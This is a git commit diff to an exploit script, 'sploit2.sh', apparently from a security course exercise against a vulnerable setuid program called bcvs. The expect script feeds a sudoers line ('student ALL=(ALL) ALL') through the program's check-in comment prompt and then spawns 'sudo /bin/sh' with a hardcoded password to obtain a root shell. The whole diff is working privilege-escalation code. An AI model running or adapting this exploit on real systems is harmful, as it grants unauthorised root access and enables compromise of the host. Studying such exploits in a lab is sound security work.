c8059e3d57207e561a35fd7cd0384aff7c1f0968
Alex Biedny <abiedny09@gmail.com>
2020-10-19 17:48:25 -0400

    fixed sploit2

--- sploit2.sh
+++ sploit2.sh
@@ -10,7 +10,11 @@ cd ..
 /usr/bin/expect -c '
 cd ~/test
 spawn /opt/bcvs/bcvs ci anything.txt
-expect "Please write a SHORT explanation:\n"
+expect "Please write a SHORT explanation:\r"
 send "student ALL=(ALL) ALL\n"
+
+spawn sudo /bin/sh
+expect "*?assword"
+send "security\r"
 '
 sudo /bin/sh
